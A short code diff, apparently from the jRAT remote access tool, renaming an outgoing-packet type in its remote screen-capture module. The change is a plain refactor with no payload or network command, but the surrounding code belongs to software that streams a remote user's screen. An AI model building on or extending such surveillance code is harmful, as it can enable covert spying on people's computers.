@@ -1,7 +1,7 @@
 package jrat.module.screen;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 import jrat.client.packets.outgoing.Packet26RemoteScreen;
 import jrat.client.packets.outgoing.Packet68RemoteScreenComplete;
 import jrat.client.utils.ScreenUtils;
@@ -70,7 +70,7 @@ public class Screen extends Thread {
 			int scaledMouseX = (int) (mouseX * scaledSize);
 			int scaledMouseY = (int) (mouseY * scaledSize);
 
-			AbstractOutgoingPacket packet;
+			OutgoingPacket packet;
 
 			int chunkWidth = image.getWidth() / columns;
 			int chunkHeight = image.getHeight() / rows;
